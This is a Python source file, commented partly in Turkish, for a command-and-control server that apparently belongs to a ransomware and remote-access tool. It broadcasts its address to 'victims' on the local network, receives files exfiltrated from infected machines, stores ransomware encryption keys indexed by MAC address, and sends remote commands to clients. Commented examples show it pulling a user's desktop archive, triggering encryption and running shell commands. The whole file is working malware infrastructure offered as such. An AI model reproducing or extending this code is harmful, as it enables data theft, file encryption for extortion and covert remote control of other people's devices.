from colorama import Fore, init
import socket, time, threading
import Database

HOST = "0.0.0.0"
IP_BROADCAST_PORT = 8999
SERVER_PORT = 9000 # Client'tan gelen mesaj portu
MESSAGE_PORT = 9001 # Client'a gönderilecek mesaj portu
FILE_TRANSFER_PORT = 9002

FILENAME = ""
#TODO byteSize clienttan gelen komuttan kaldırılabilir, kullanılmıyor.

init(convert=True) # Colorama

def print_green(txt):
    print(Fore.GREEN + txt + Fore.RESET)

def print_red(txt):
    print(Fore.RED + txt + Fore.RESET)

def print_blue(txt):
    print(Fore.CYAN + txt + Fore.RESET)

def receive_file():
    global FILENAME

    while True:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, FILE_TRANSFER_PORT))     # bind the socket to the IP address and port number
        server_socket.listen(1) # listen for incoming connections
        client_socket, address = server_socket.accept() # accept the client connection
        
        filedata = b''
        while True: # receive the file data from the client
            data = client_socket.recv(1024)
            if not data:
                break
            filedata += data

        server_socket.close()

        print_green(f"\"{FILENAME}\" is received.")
        if "\\" in FILENAME:
            FILENAME = FILENAME.split("\\")[-1]
        if "/" in FILENAME:
            FILENAME = FILENAME.split("/")[-1]

        with open("./RecvFiles/" + FILENAME, 'wb') as file:
            file.write(filedata)
        
        FILENAME = ""

def send_file(clientIP, path):
    try:
        filedata = b''
        with open(path, 'rb') as file:
            filedata = file.read()

        fname = path.split("/")[-1]
        send_msg(clientIP, f"fileTransfer;save?fileName={fname}")
        time.sleep(1)

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object    
        client_socket.connect((clientIP, FILE_TRANSFER_PORT + 1)) # connect to server
        print_blue("[Send File] File transfer started.")
        client_socket.sendall(filedata) # send the PDF file to the server    
        client_socket.close() # close the socket connection
        print_green("[Send File] File is sent.")
    except Exception as e:
        print_red("[Send File] Error occurred.")
        print(e)

def manager_fileTransfer(ip, msg):
    global FILENAME
    isSuccess = True
    try:
        msgType = msg.split("?")[0]
        parameters = msg.split("?")[1].split("&")
        if msgType == "save":
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "fileName":
                    FILENAME = value
        elif msgType == "fileList":
            filePaths = ""
            seperator = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "paths":
                    filePaths = value
                elif key == "sep":
                    seperator = value
            pathList = filePaths.split(seperator)
            isSuccess = Database.store_file_paths(ip, pathList)
    except Exception as e:
        print_red("[File Transfer Manager] Error occurred.")
        #print(e)
        isSuccess = False
    
    return isSuccess
            

def manager_command(ip, msg):
    isSuccess = True
    try:
        msgType = msg.split("???")[0]
        parameters = msg.split("???")[1].split("&&&")
        if msgType == "response":
            command = ""
            result = ""
            for parameter in parameters:
                key = parameter.split("===")[0]
                value = parameter.split("===")[1]
                if key == "result":
                    result = value
                elif key == "cmd":
                    command = value
            print_green(f"[Command Manager] Execution output of '{command}'")
            print(result)
            isSuccess = Database.log_command_result(ip, command, result)
    except Exception as e:
        print_red("[Ransomware Manager] Error occurred.")
        print(e)
        isSuccess = False
    
    return isSuccess

def manager_ransomware(ip, msg):
    isSuccess = True
    try:
        msgType = msg.split("?")[0]
        parameters = msg.split("?")[1].split("&")
        if msgType == "storeKey":
            macAddress = ""
            encryptKey = ""
            for parameter in parameters:
                key = parameter.split("=")[0]
                value = parameter.split("=")[1]
                if key == "mac":
                    macAddress = value
                elif key == "key":
                    encryptKey = value
            isSuccess = Database.store_key(macAddress, encryptKey)
    except Exception as e:
        print_red("[Ransomware Manager] Error occurred.")
        #print(e)
        isSuccess = False
    
    return isSuccess


def distribute_ip(): # broadcasts local ip address to the victims' devices every second
    print_blue("[Distribute IP] Server IP distribution is started.")
    # set the message and the port number
    message = socket.gethostbyname(socket.gethostname())

    # create a UDP socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # set the socket options to allow broadcast
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # get the local IP address and subnet mask
    local_ip = socket.gethostbyname(socket.gethostname())
    subnet_mask = socket.inet_ntoa(socket.inet_aton(local_ip)[:3] + b'\xff')
    try:
        while True:
            # send the message to all possible local IP addresses
            for i in range(1, 255):
                ip = f"{local_ip.split('.')[0]}.{local_ip.split('.')[1]}.{local_ip.split('.')[2]}.{i}"
                #print(ip)
                if ip != subnet_mask: #ip != local_ip and 
                    s.sendto(message.encode('utf-8'), (ip, IP_BROADCAST_PORT))
            time.sleep(1)

    except KeyboardInterrupt:
        # close the socket
        s.close()

# Thread function to handle client connections
def handle_client(conn, addr):
    print_blue(f"[Handle Client] Communication with {addr} is started.")
    
    data = b''
    while True:
        data = conn.recv(1024)
        if data:
            break

    #print("Received message:", data.decode())    
    
    ip = addr[0]
    processType = data.decode().split(";")[0]
    message = data.decode().split(";")[1]
    
    result = False
    if processType == "info":
        result = Database.save_client_info(ip, message) # TODO cihaz modeli, işletim sistemi gibi farklı parametreler eklenebilir.
    elif processType == "fileTransfer":
        result = manager_fileTransfer(ip, message)
    elif processType == "command":
        result = manager_command(ip, message)
    elif processType == "ransomware":
        result = manager_ransomware(ip, message)
    else:
        conn.sendall(b'INVALID_MESSAGE')

    conn.sendall(b'SUCCESS' if result == True else b'FAIL')
    conn.close()
    print_blue(f"[Handle Client] Communication with {addr} is ended.")

def listen_clients():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP/IP socket
        sock.bind((HOST, SERVER_PORT)) # Bind the socket to a specific address and port    
        sock.listen(5) # Listen for incoming connections

        print_blue(f"[Listen Clients] Server listening on {HOST}:{SERVER_PORT}")
        
        while True: # Main loop to accept client connections
            conn, addr = sock.accept() # Wait for a connection
            threading.Thread(target=handle_client, args=(conn, addr)).start() # Start a new thread to handle the client
    
    except KeyboardInterrupt:
        exit()

def send_msg(clientIP, msg):
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect the socket to the server's address and port
        sock.connect((clientIP, MESSAGE_PORT))

        # Send the message to the server
        sock.sendall(msg.encode())
        print_green(f"[Send Message] Message is sent to {clientIP}")
        
        # Close the connection
        sock.close()
    except Exception as e:
        print_red("[Send Message] Error occurred.")

if __name__ == "__main__":
    threading.Thread(target=distribute_ip).start()
    threading.Thread(target=listen_clients).start()
    threading.Thread(target=receive_file).start()
    
    time.sleep(2)
    #send_msg("192.168.1.43", "fileTransfer;sendFile?path=C:/Users/YasinEnesPolat/Desktop/2021 Summer Term Internship Reports (1).zip")
    #send_msg("192.168.1.43", "ransomware;encrypt?keywords=leakToolTest_")
    
    #decryptionKey = Database.get_key("E8:48:B8:C8:20:00")
    #send_msg("192.168.1.43", f"ransomware;decrypt?decryptionKey={decryptionKey}")

    #send_msg("192.168.1.43", "command;execute?cmd=ping 1.1.1.1")
    #send_msg("192.168.1.43", "command;execute?cmd=dir")

    #print(Database.get_victim("E8:48:B8:C8:20:00"))